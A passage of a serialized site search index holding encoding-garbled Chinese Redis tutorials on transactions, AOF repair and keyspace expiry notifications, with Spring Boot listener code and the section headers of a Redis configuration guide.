å°è¿äºå½ä»¤ä½ä¸ºä¸ä¸ªåç¬çéç¦»æä½æ§è¡ã\n\næä»¬æ­£å¸¸çè§å¿µè®¤ä¸ºï¼å½æ§è¡æä¸ä¸ªäºå¡ä¸­ï¼ææ¥éå°±ä¼åæ»æ°æ®ï¼redis å¹¶ä¸æ¯è¿æ ·å¤ççã é¦åæç¡®éè¿° redis æ¯æ²¡æåæ»çãç¶åæä»¬æ¢è®¨ä¸ç´æ§çé®é¢ï¼redis ä¸ç´æ§çå¤çæ¹å¼æ¯ï¼å¦æè¯­æ³ä¸æç¡®çåºç° errorï¼ä¼è®¤ä¸ºæ´ä¸ªäºå¡å°±æ¯ errorï¼ä½æ°æ®ä¸åºç° errorï¼å¶ä½å½ä»¤è¿æ¯ä¼æåã ä»¥ä¸æ¯è¯­æ³åºéï¼è¿ä¸ªäºå¡ä¹å°±æ¯éè¯¯çï¼å¯æ ä¼æ­¢çé®å¥å½ä»¤ï¼ä½é½ä¸ä¼æåã\n\n\n\nä»¥ä¸æ¯ï¼æ°æ®éè¯¯ï¼æéå¤ç key åºç°ï¼ä½å¹¶ä¸å½±åå¶ä½å½ä»¤çæä½ã\n\n\n\n\n# redis äºå¡ç½ç»ä¸­æ­æèæå¡åæ­¢å®æºçä¿®å¤æ¹å¼\n\nå½æä¸ªå®¢æ·ç«¯æ­£å¨æ§è¡ä¸æ¬¡äºå¡æ¶ï¼å¦æå®å¨è°ç¨ multi å½ä»¤ä¹åå°±ä» redis æå¡ç«¯æ­å¼è¿æ¥ï¼é£ä¹å°±ä¸ä¼æ§è¡äºå¡ä¸­çä»»ä½æä½ï¼ç¸åï¼å¦æå®å¨è°ç¨ exec å½ä»¤ä¹åæä» redis æå¡ç«¯æ­å¼è¿æ¥ï¼é£ä¹å°±ä¼æ§è¡äºå¡ä¸­çæææä½ãå½ redis ä½¿ç¨åªå¢æä»¶ï¼aofï¼append-only fileï¼æ¶ï¼redis è½å¤ç¡®ä¿ä½¿ç¨ä¸ä¸ªåç¬ç write (2) ç³»ç»è°ç¨ï¼è¿æ ·ä¾¿è½å°äºå¡åå¥ç£çã\n\nå¦æ redis æå¡å¨å®æºï¼æèç³»ç»ç®¡çåä»¥æç§æ¹å¼åæ­¢ redis æå¡è¿ç¨çè¿è¡ï¼é£ä¹ redis å¾æå¯è½åªæ§è¡äºäºå¡ä¸­çä¸é¨åæä½ãredis å°ä¼å¨éæ°å¯å¨æ¶æ£æ¥ä¸è¿°ç¶æï¼ç¶åéåºè¿è¡ï¼å¹¶ä¸è¾åºæ¥éä¿¡æ¯ã\n\nä½¿ç¨ redis-check-aof å·¥å·å¯ä»¥ä¿®å¤ä¸è¿°çåªå¢æä»¶ï¼è¿ä¸ªå·¥å·å°ä¼ä»ä¸è¿°æä»¶ä¸­å é¤æ§è¡ä¸å®å¨çäºå¡ï¼è¿æ · redis æå¡å¨æè½åæ¬¡å¯å¨ã\n\n\n# redis äºå¡ç¸å³å½ä»¤\n\nmulti -> ç¨äºæ è®°äºå¡åçå¼å§ãredis ä¼å°åç»­çå½ä»¤éä¸ªæ¾å¥éåä¸­ï¼ç¶åæè½ä½¿ç¨ exec å½ä»¤åå­åå°æ§è¡è¿ä¸ªå½ä»¤åºåãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ okã\n\nexec -> å¨ä¸ä¸ªäºå¡ä¸­æ§è¡ææååæ¾å¥éåçå½ä»¤ï¼ç¶åæ¢å¤æ­£å¸¸çè¿æ¥ç¶æãå½ä½¿ç¨ watch å½ä»¤æ¶ï¼åªæå½åçæ§çé®æ²¡æè¢«ä¿®æ¹æ¶ï¼exec å½ä»¤æä¼æ§è¡äºå¡ä¸­çå½ä»¤ï¼è¿ç§æ¹å¼å©ç¨äºæ£æ¥åè®¾ç½®ï¼casï¼çæºå¶ãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªæ°ç»ï¼å¶ä¸­çæ¯ä¸ªåç´ åå«æ¯åå­åäºå¡ä¸­çæ¯ä¸ªå½ä»¤çè¿åå¼ã å½ä½¿ç¨ watch å½ä»¤æ¶ï¼å¦æäºå¡æ§è¡ä¸­æ­¢ï¼é£ä¹ exec å½ä»¤å°±ä¼è¿åä¸ä¸ª null å¼ã\n\ndiscard -> æ¸é¤ææååå¨ä¸ä¸ªäºå¡ä¸­æ¾å¥éåçå½ä»¤ï¼ç¶åæ¢å¤æ­£å¸¸çè¿æ¥ç¶æãå¦æä½¿ç¨äº watch å½ä»¤ï¼é£ä¹ discard å½ä»¤å°±ä¼å°å½åè¿æ¥çæ§çææé®åæ¶çæ§ãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ okã\n\n\n\nwatch -> å½æä¸ªäºå¡éè¦ææ¡ä»¶æ§è¡æ¶ï¼å°±è¦ä½¿ç¨è¿ä¸ªå½ä»¤å°ç»å®çé®è®¾ç½®ä¸ºåçæ§çãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ okãå¯¹äºæ¯ä¸ªé®æ¥è¯´ï¼æ¶é´å¤æåº¦æ»æ¯ o (1)ã\n\nä»¥ä¸æ¼ç¤ºäº watch ä¹è§é çç¤ºä¾ï¼(1) å½ä¸ä¸ªå®¢æ·ç«¯ (a) å¯¹ä¸ä¸ªåé (a) è¿è¡äºçå¬æ­¤æ¶ a = 3 å¹¶å¼å¯äºäºå¡ï¼å¦ä¸ä¸ªå®¢æ·ç«¯ (b) æ¹åäº a çå¼ a = 4ï¼é£ä¹ (a) å®¢æ·ç«¯æ§è¡å®äºå¡åï¼exec ä¼è¿å nil (null) ï¼(2) å¦ææ²¡æç«äºï¼åæ­£ç¡®æ§è¡ã\n\n\n\n\n\nwatch ä¸å®æ¯åäºå¡ä¸èµ·ä½¿ç¨æææã\n\nunwatch -> æ¸é¤ææååä¸ºä¸ä¸ªäºå¡çæ§çé®ãå¦æä½ è°ç¨äº exec æ discard å½ä»¤ï¼é£ä¹å°±ä¸éè¦æå¨è°ç¨ unwatch å½ä»¤ãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ okã",charsets:{cjk:!0}},{title:"Redisçkeyå¤±æéç¥ä»ç»",frontmatter:{title:"Redisçkeyå¤±æéç¥ä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1604",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1604.Redis%E7%9A%84key%E5%A4%B1%E6%95%88%E9%80%9A%E7%9F%A5%E4%BB%8B%E7%BB%8D.html",relativePath:"04.ä¸­é´ä»¶/03.redis/1604.Redisçkeyå¤±æéç¥ä»ç».md",key:"v-19b3d0ca",path:"/Redis/1604/",headers:[{level:2,title:"ä¿®æ¹ redis.conf éç½®",slug:"ä¿®æ¹-redis-conf-éç½®",normalizedTitle:"ä¿®æ¹ redis.conf éç½®",charIndex:2},{level:2,title:"spring boot redis key å¤±æéç¥éç½®",slug:"spring-boot-redis-key-å¤±æéç¥éç½®",normalizedTitle:"spring boot redis key å¤±æéç¥éç½®",charIndex:815},{level:3,title:"æ·»å éç½®ç±»",slug:"æ·»å éç½®ç±»",normalizedTitle:"æ·»å éç½®ç±»",charIndex:848},{level:3,title:"æ¥å£",slug:"æ¥å£",normalizedTitle:"æ¥å£",charIndex:3496},{level:3,title:"å®ç°ç±»",slug:"å®ç°ç±»",normalizedTitle:"å®ç°ç±»",charIndex:3875}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"ä¿®æ¹ redis.conf éç½® spring boot redis key å¤±æéç¥éç½® æ·»å éç½®ç±» æ¥å£ å®ç°ç±»",content:'# ä¿®æ¹ redis.conf éç½®\n\næ¾å° notify-keyspace-events å¹¶å° notify-keyspace-events ä¿®æ¹ä¸º notify-keyspace-events Ex\n\n\n\néç½® Ex å¯¹åºçææå¦ä¸ï¼ E: é®äºä»¶éç¥ï¼ä»¥ __keysevent@<db>__ ä¸ºåç¼ x: è¿æäºä»¶ï¼æ¯æ¬¡ key è¿ææ¶çæï¼\n\n * K é®ç©ºé´éç¥ï¼ä»¥ __keyspace@<db>__ ä¸ºåç¼\n * E é®äºä»¶éç¥ï¼ä»¥ __keysevent@<db>__ ä¸ºåç¼\n * g del , expipre , rename ç­ç±»åæ å³çéç¨å½ä»¤çéç¥ï¼...\n * $ String å½ä»¤\n * l List å½ä»¤\n * s Set å½ä»¤\n * h Hash å½ä»¤\n * z æåºéåå½ä»¤\n * x è¿æäºä»¶ï¼æ¯æ¬¡ key è¿ææ¶çæï¼\n * e é©±éäºä»¶ï¼å½ key å¨åå­æ»¡äºè¢«æ¸é¤æ¶çæï¼\n * A g$lshzxe çå«åï¼å æ­¤âAKEâ æå³çææçäºä»¶\n\nnotify-keyspace-eventséé¡¹\næå¡å¨éç½®çnotify-keyspace-eventséé¡¹å³å®äºæå¡å¨æåééç¥çç±»åï¼\nå¯ä»¥è®¾ç½®çç±»åå¦ä¸ï¼\næ³è®©æå¡å¨åéææç±»åçé®ç©ºé´éç¥åé®äºä»¶éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºAKE\næ³è®©æå¡å¨åéææç±»åçé®ç©ºé´éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºAK\næ³è®©æå¡å¨åéææç±»åçé®äºä»¶éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºAE\næ³è®©æå¡å¨åªåéåå­ç¬¦ä¸²é®æå³çé®ç©ºé´éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºK$\næ³è®©æå¡å¨åªåéååè¡¨é®æå³çé®äºä»¶éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºEl\nå¤æ³¨ï¼notify-keyspace-eventséé¡¹çé»è®¤å¼ä¸ºç©ºï¼æä»¥å¦æä¸è®¾ç½®ä¸é¢çå¼ï¼SUBSCRIBEå½ä»¤ä¸ä¼æä»»ä½ææ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¶ä¸­åçå°±æ¯ä½¿ç¨äº redis çåå¸è®¢éåè½ã\n\n\n# spring boot redis key å¤±æéç¥éç½®\n\n\n# æ·»å éç½®ç±»\n\npackage com.giant.cloud.config;\n\nimport com.giant.cloud.support.ReceiveNoticeMessage;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnBean;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.redis.connection.MessageListener;\nimport org.springframework.data.redis.connection.RedisConnectionFactory;\nimport org.springframework.data.redis.listener.ChannelTopic;\nimport org.springframework.data.redis.listener.RedisMessageListenerContainer;\nimport org.springframework.data.redis.listener.adapter.MessageListenerAdapter;\n\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.stream.Collectors;\n\n/**\n * @author big uncle\n * @date 2020/7/13 16:24\n * @module\n **/\n@Configuration\n@ConditionalOnBean(ReceiveNoticeMessage.class)\n@Slf4j\npublic class RedisNoticeConfig {\n\n    @Value("${spring.redis.database:0}")\n    private Integer db;\n\n    @Autowired\n    ReceiveNoticeMessage receiveNoticeMessage;\n\n    /**\n     * å° Receiveræ³¨åä¸ºä¸ä¸ªæ¶æ¯çå¬å¨ï¼å¹¶æå®æ¶æ¯æ¥æ¶çæ¹æ³(expiredMessage)\n     * å¦æä¸æå®æ¶æ¯æ¥æ¶çæ¹æ³ï¼æ¶æ¯çå¬å¨ä¼é»è®¤çå¯»æ¾Receiverä¸­çhandleMessageè¿ä¸ªæ¹æ³åä¸ºæ¶æ¯æ¥æ¶çæ¹å¼\n    **/\n    @Bean\n    MessageListener messageListener(){\n        return new MessageListenerAdapter(receiveNoticeMessage(),"noticeMessage");\n    }\n\n    @Bean\n    ReceiveNoticeMessage receiveNoticeMessage(){\n        return receiveNoticeMessage;\n    }\n\n    /**\n     * è®¾ç½®çå¬ç±»å\n    **/\n    @Bean\n    public List<ChannelTopic> channelTopic(){\n        String name = "__keyevent@"+db.intValue()+"__:%s";\n        List<String> commands = Arrays.asList("set","lpush","expired");\n        return commands.stream().map(i -> new ChannelTopic(String.format(name,i))).collect(Collectors.toList());\n    }\n\n    /**\n     * éè¿ RedisMessageListenerContainer éç½®çå¬çæ\n    **/\n    @Bean\n    public RedisMessageListenerContainer redisMessageListenerContainer(@Autowired RedisConnectionFactory redisConnectionFactory){\n        RedisMessageListenerContainer redisMessageListenerContainer = new RedisMessageListenerContainer();\n        redisMessageListenerContainer.setConnectionFactory(redisConnectionFactory);\n        redisMessageListenerContainer.addMessageListener(messageListener(),channelTopic());\n        return redisMessageListenerContainer;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n\n\n\n# æ¥å£\n\npackage com.giant.cloud.support;\n\n/**\n * @author big uncle\n * @date 2020/7/13 17:13\n **/\npublic interface ReceiveNoticeMessage {\n    /**\n     * å¤±ææ¥æ¶æ¹æ³\n     * @author big uncle\n     * @date 2020/7/13 17:14\n     * @param key\n     * @param channel\n     * @return void\n    **/\n    void noticeMessage(String key,String channel);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# å®ç°ç±»\n\npackage com.giant.cloud.monitor;\n\nimport com.giant.cloud.support.ReceiveNoticeMessage;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\n\n/**\n * @author big uncle\n * @date 2020/10/9 17:49\n * @module\n **/\n@Component\n@Slf4j\npublic class RedisKeyMonitor implements ReceiveNoticeMessage {\n\n    @Override\n    public void noticeMessage(String key,String channel) {\n        log.debug("key is {}, channel is {}",key,channel);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',normalizedContent:'# ä¿®æ¹ redis.conf éç½®\n\næ¾å° notify-keyspace-events å¹¶å° notify-keyspace-events ä¿®æ¹ä¸º notify-keyspace-events ex\n\n\n\néç½® ex å¯¹åºçææå¦ä¸ï¼ e: é®äºä»¶éç¥ï¼ä»¥ __keysevent@<db>__ ä¸ºåç¼ x: è¿æäºä»¶ï¼æ¯æ¬¡ key è¿ææ¶çæï¼\n\n * k é®ç©ºé´éç¥ï¼ä»¥ __keyspace@<db>__ ä¸ºåç¼\n * e é®äºä»¶éç¥ï¼ä»¥ __keysevent@<db>__ ä¸ºåç¼\n * g del , expipre , rename ç­ç±»åæ å³çéç¨å½ä»¤çéç¥ï¼...\n * $ string å½ä»¤\n * l list å½ä»¤\n * s set å½ä»¤\n * h hash å½ä»¤\n * z æåºéåå½ä»¤\n * x è¿æäºä»¶ï¼æ¯æ¬¡ key è¿ææ¶çæï¼\n * e é©±éäºä»¶ï¼å½ key å¨åå­æ»¡äºè¢«æ¸é¤æ¶çæï¼\n * a g$lshzxe çå«åï¼å æ­¤âakeâ æå³çææçäºä»¶\n\nnotify-keyspace-eventséé¡¹\næå¡å¨éç½®çnotify-keyspace-eventséé¡¹å³å®äºæå¡å¨æåééç¥çç±»åï¼\nå¯ä»¥è®¾ç½®çç±»åå¦ä¸ï¼\næ³è®©æå¡å¨åéææç±»åçé®ç©ºé´éç¥åé®äºä»¶éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºake\næ³è®©æå¡å¨åéææç±»åçé®ç©ºé´éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºak\næ³è®©æå¡å¨åéææç±»åçé®äºä»¶éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºae\næ³è®©æå¡å¨åªåéåå­ç¬¦ä¸²é®æå³çé®ç©ºé´éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºk$\næ³è®©æå¡å¨åªåéååè¡¨é®æå³çé®äºä»¶éç¥ï¼å¯ä»¥å°éé¡¹çå¼è®¾ç½®ä¸ºel\nå¤æ³¨ï¼notify-keyspace-eventséé¡¹çé»è®¤å¼ä¸ºç©ºï¼æä»¥å¦æä¸è®¾ç½®ä¸é¢çå¼ï¼subscribeå½ä»¤ä¸ä¼æä»»ä½ææ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¶ä¸­åçå°±æ¯ä½¿ç¨äº redis çåå¸è®¢éåè½ã\n\n\n# spring boot redis key å¤±æéç¥éç½®\n\n\n# æ·»å éç½®ç±»\n\npackage com.giant.cloud.config;\n\nimport com.giant.cloud.support.receivenoticemessage;\nimport lombok.extern.slf4j.slf4j;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.beans.factory.annotation.value;\nimport org.springframework.boot.autoconfigure.condition.conditionalonbean;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.data.redis.connection.messagelistener;\nimport org.springframework.data.redis.connection.redisconnectionfactory;\nimport org.springframework.data.redis.listener.channeltopic;\nimport org.springframework.data.redis.listener.redismessagelistenercontainer;\nimport org.springframework.data.redis.listener.adapter.messagelisteneradapter;\n\nimport java.util.arrays;\nimport java.util.list;\nimport java.util.stream.collectors;\n\n/**\n * @author big uncle\n * @date 2020/7/13 16:24\n * @module\n **/\n@configuration\n@conditionalonbean(receivenoticemessage.class)\n@slf4j\npublic class redisnoticeconfig {\n\n    @value("${spring.redis.database:0}")\n    private integer db;\n\n    @autowired\n    receivenoticemessage receivenoticemessage;\n\n    /**\n     * å° receiveræ³¨åä¸ºä¸ä¸ªæ¶æ¯çå¬å¨ï¼å¹¶æå®æ¶æ¯æ¥æ¶çæ¹æ³(expiredmessage)\n     * å¦æä¸æå®æ¶æ¯æ¥æ¶çæ¹æ³ï¼æ¶æ¯çå¬å¨ä¼é»è®¤çå¯»æ¾receiverä¸­çhandlemessageè¿ä¸ªæ¹æ³åä¸ºæ¶æ¯æ¥æ¶çæ¹å¼\n    **/\n    @bean\n    messagelistener messagelistener(){\n        return new messagelisteneradapter(receivenoticemessage(),"noticemessage");\n    }\n\n    @bean\n    receivenoticemessage receivenoticemessage(){\n        return receivenoticemessage;\n    }\n\n    /**\n     * è®¾ç½®çå¬ç±»å\n    **/\n    @bean\n    public list<channeltopic> channeltopic(){\n        string name = "__keyevent@"+db.intvalue()+"__:%s";\n        list<string> commands = arrays.aslist("set","lpush","expired");\n        return commands.stream().map(i -> new channeltopic(string.format(name,i))).collect(collectors.tolist());\n    }\n\n    /**\n     * éè¿ redismessagelistenercontainer éç½®çå¬çæ\n    **/\n    @bean\n    public redismessagelistenercontainer redismessagelistenercontainer(@autowired redisconnectionfactory redisconnectionfactory){\n        redismessagelistenercontainer redismessagelistenercontainer = new redismessagelistenercontainer();\n        redismessagelistenercontainer.setconnectionfactory(redisconnectionfactory);\n        redismessagelistenercontainer.addmessagelistener(messagelistener(),channeltopic());\n        return redismessagelistenercontainer;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n\n\n\n# æ¥å£\n\npackage com.giant.cloud.support;\n\n/**\n * @author big uncle\n * @date 2020/7/13 17:13\n **/\npublic interface receivenoticemessage {\n    /**\n     * å¤±ææ¥æ¶æ¹æ³\n     * @author big uncle\n     * @date 2020/7/13 17:14\n     * @param key\n     * @param channel\n     * @return void\n    **/\n    void noticemessage(string key,string channel);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# å®ç°ç±»\n\npackage com.giant.cloud.monitor;\n\nimport com.giant.cloud.support.receivenoticemessage;\nimport lombok.extern.slf4j.slf4j;\nimport org.springframework.stereotype.component;\n\n/**\n * @author big uncle\n * @date 2020/10/9 17:49\n * @module\n **/\n@component\n@slf4j\npublic class rediskeymonitor implements receivenoticemessage {\n\n    @override\n    public void noticemessage(string key,string channel) {\n        log.debug("key is {}, channel is {}",key,channel);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',charsets:{cjk:!0}},{title:"Rediséç½®æä»¶è§£è¯»",frontmatter:{title:"Rediséç½®æä»¶è§£è¯»",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1605",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1605.Redis%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%A7%A3%E8%AF%BB.html",relativePath:"04.ä¸­é´ä»¶/03.redis/1605.Rediséç½®æä»¶è§£è¯».md",key:"v-0a009914",path:"/Redis/1605/",headers:[{level:2,title:"network ç½ç»",slug:"network-ç½ç»",normalizedTitle:"network ç½ç»",charIndex:24},{level:3,title:"+ bind",slug:"bind",normalizedTitle:"+ bind",charIndex:39},{level:3,title:"+ protected-mode",slug:"protected-mode",normalizedTitle:"+ protected-mode",charIndex:165},{level:3,title:"+ port",slug:"port",normalizedTitle:"+ port",charIndex:283},{level:3,title:"+ tcp-backlog",slug:"tcp-backlog",normalizedTitle:"+ tcp-backlog",charIndex:321},{level:5,title:"æ¥çéåå¤§å°",slug:"æ¥çéåå¤§å°",normalizedTitle:"æ¥çéåå¤§å°",charIndex:846},{level:5,title:"ä¿®æ¹éåå¤§å°",slug:"ä¿®æ¹éåå¤§å°",normalizedTitle:"ä¿®æ¹éåå¤§å°",charIndex:970},{level:3,title:"timeout",slug:"timeout",normalizedTitle:"timeout",charIndex:1128},{level:3,title:"tcp-keepalive",slug:"tcp-keepalive",normalizedTitle:"tcp-keepalive",charIndex:1178},{level:2,title:"general ä¸è¬",slug:"general-ä¸è¬",normalizedTitle:"general ä¸è¬",charIndex:1282},{level:3,title:"daemonize",slug:"daemonize",normalizedTitle:"daemonize",charIndex:1297},{level:3,title:"supervised",slug:"supervised",normalizedTitle:"supervised",charIndex:1418},{level:3,title:"pidfile",slug:"pidfile",normalizedTitle:"pidfile",charIndex:1828},{level:3,title:"loglevel",slug:"loglevel",normalizedTitle:"loglevel",charIndex:1953},{level:3,title:"logfile",slug:"logfile",normalizedTitle:"logfile",charIndex:2135},{level:3,title:"databases",slug:"databases",normalizedTitle:"databases",charIndex:2238},{level:3,title:"always-show-logo",slug:"always-show-logo",normalizedTitle:"always-show-logo",charIndex:2358},{level:2,title:"snapshotting å¿«ç§",slug:"snapshotting-å¿«ç§",normalizedTitle:"snapshotting å¿«ç§",charIndex:2425},{level:3,title:"save",slug:"save",normalizedTitle:"save",charIndex:2445},{level:3,title:"stop-writes-on-bgsave-error",slug:"stop-writes-on-bgsave-error",normalizedTitle:"stop-writes-on-bgsave-error",charIndex:2619},{level:3,title:"rdbcompression",slug:"rdbcompression",normalizedTitle:"rdbcompression",charIndex:2812},{level:3,title:"rdbchecksum",slug:"rdbchecksum",normalizedTitle:"rdbchecksum",charIndex:2966},{level:3,title:"dbfilename",slug:"dbfilename",normalizedTitle:"dbfilename",charIndex:3089},{level:3,title:"rdb-del-sync-files",slug:"rdb-del-sync-files",normalizedTitle:"rdb-del-sync-files",charIndex:3143},{level:3,title:"åå»ºrdbæä»¶æºå¶",slug:"åå»ºrdbæä»¶æºå¶",normalizedTitle:"åå»º rdb æä»¶æºå¶",charIndex:3238},{level:2,title:"replication ä¸»ä»å¤å¶",slug:"replication-ä¸»ä»å¤å¶",normalizedTitle:"replication ä¸»ä»å¤å¶",charIndex:3889},{level:3,title:"replica-serve-stale-data",slug:"replica-serve-stale-data",normalizedTitle:"replica-serve-stale-data",charIndex:3910},{level:3,title:"replica-read-only",slug:"replica-read-only",normalizedTitle:"replica-read-only",charIndex:4183},{level:3,title:"repl-diskless-sync",slug:"repl-diskless-sync",normalizedTitle:"repl-diskless-sync",charIndex:4272},{level:3,title:"repl-diskless-sync-delay",slug:"repl-diskless-sync-delay",normalizedTitle:"repl-diskless-sync-delay",charIndex:4343},{level:3,title:"repl-diskless-load",slug:"repl-diskless-load",normalizedTitle:"repl-diskless-load",charIndex:4479},{level:3,title:"repl-disable-tcp-nodelay",slug:"repl-disable-tcp-nodelay",normalizedTitle:"repl-disable-tcp-nodelay",charIndex:4536},{level:3,title:"replica-priority",slug:"replica-priority",normalizedTitle:"replica-priority",charIndex:4690},{level:2,title:"- keys tracking é®è¿½è¸ª",slug:"keys-tracking-é®è¿½è¸ª",normalizedTitle:"- keys tracking é®è¿½è¸ª",charIndex:4857},{level:2,title:"security å®å¨",slug:"security-å®å¨",normalizedTitle:"security å®å¨",charIndex:4919},{level:3,title:"+ acllog-max-len",slug:"acllog-max-len",normalizedTitle:"+ acllog-max-len",charIndex:4935},{level:3,title:"- aclfile",slug:"aclfile",normalizedTitle:"- aclfile",charIndex:4981},{level:3,title:"- requirepass",slug:"requirepass",normalizedTitle:"- requirepass",charIndex:5030},{level:3,title:"- rename-command",slug:"rename-command",normalizedTitle:"- rename-command",charIndex:5075},{level:2,title:"clients å®¢æ·",slug:"clients-å®¢æ·",normalizedTitle:"clients å®¢æ·",charIndex:5127},{level:3,title:"maxclients",slug:"maxclients",normalizedTitle:"maxclients",charIndex:5142},{level:2,title:"memory management åå­ç®¡ç",slug:"memory-management-åå­ç®¡ç",normalizedTitle:"memory management åå­ç®¡ç",charIndex:5432},{level:3,title:"maxmemory",slug:"maxmemory",normalizedTitle:"maxmemory",charIndex:5459},{level:3,title:"maxmemory-policy",slug:"maxmemory-policy",normalizedTitle:"maxmemory-policy",charIndex:5548},{level:3,title:"maxmemory-samples",slug:"maxmemory-samples",normalizedTitle:"maxmemory-samples",charIndex:6117},{level:3,title:"replica-ignore-maxmemory",slug:"replica-ignore-maxmemory",normalizedTitle:"replica-ignore-maxmemory",charIndex:6352},{level:3,title:"active-expire-effort",slug:"active-expire-effort",normalizedTitle:"active-expire-effort",charIndex:6854},{level:2,title:"lazy freeing ææ°éæ¾",slug:"lazy-freeing-ææ°éæ¾",normalizedTitle:"lazy freeing ææ°éæ¾",charIndex:6908},{level:3,title:"lazyfree-lazy-eviction",slug:"lazyfree-lazy-eviction",normalizedTitle:"lazyfree-lazy-eviction",charIndex:6979},{level:3,title:"lazyfree-lazy-expire",slug:"lazyfree-lazy-expire",normalizedTitle:"lazyfree-lazy-expire",charIndex:7005},{level:3,title:"lazyfree-lazy-server-del",slug:"lazyfree-lazy-server-del",normalizedTitle:"lazyfree-lazy-server-del",charIndex:7029},{level:3,title:"slave-lazy-flush",slug:"slave-lazy-flush",normalizedTitle:"slave-lazy-flush",charIndex:7524},{level:3,title:"lazyfree-lazy-user-del",slug:"lazyfree-lazy-user-del",normalizedTitle:"lazyfree-lazy-user-del",charIndex:7687},{level:2,title:"threaded I/O çº¿ç¨",slug:"threaded-i-o-çº¿ç¨",normalizedTitle:"threaded i/o çº¿ç¨",charIndex:7816},{level:3,title:"io-threads-do-reads",slug:"io-threads-do-reads",normalizedTitle:"io-threads-do-reads",charIndex:8054},{level:2,title:"kernel oom control åæ ¸ oom æ§å¶",slug:"kernel-oom-control-åæ ¸-oom-æ§å¶",normalizedTitle:"kernel oom control åæ ¸ oom æ§å¶",charIndex:8312},{level:2,title:"append only mode AOF è¿½å æ¨¡å¼",slug:"append-only-mode-aof-è¿½å æ¨¡å¼",normalizedTitle:"append only mode aof è¿½å æ¨¡å¼",charIndex:8710},{level:3,title:"appendonly",slug:"appendonly",normalizedTitle:"appendonly",charIndex:8851},{level:3,title:"appendfilename",slug:"appendfilename",normalizedTitle:"appendfilename",charIndex:8896},{level:3,title:"appendfsync",slug:"appendfsync",normalizedTitle:"appendfsync",charIndex:8969},{level:3,title:"no-appendfsync-on-rewrite",slug:"no-appendfsync-on-rewrite",normalizedTitle:"no-appendfsync-on-rewrite",charIndex:9168},{level:3,title:"auto-aof-rewrite-percentage auto-aof-rewrite-min-size",slug:"auto-aof-rewrite-percentage-auto-aof-rewrite-min-size",normalizedTitle:"auto-aof-rewrite-percentage auto-aof-rewrite-min-size",charIndex:9603},{level:3,title:"auto-aof-rewrite-min-size",slug:"auto-aof-rewrite-min-size",normalizedTitle:"auto-aof-rewrite-min-size",charIndex:9631},{level:5,title:"rewriteæºå¶",slug:"rewriteæºå¶",normalizedTitle:"rewrite æºå¶",charIndex:10040},{level:3,title:"aof-load-truncated",slug:"aof-load-truncated",normalizedTitle:"aof-load-truncated",charIndex:10647},{level:3,title:"aof-use-rdb-preamble",slug:"aof-use-rdb-preamble",normalizedTitle:"aof-use-rdb-preamble",charIndex:10807},{level:2,title:"lua 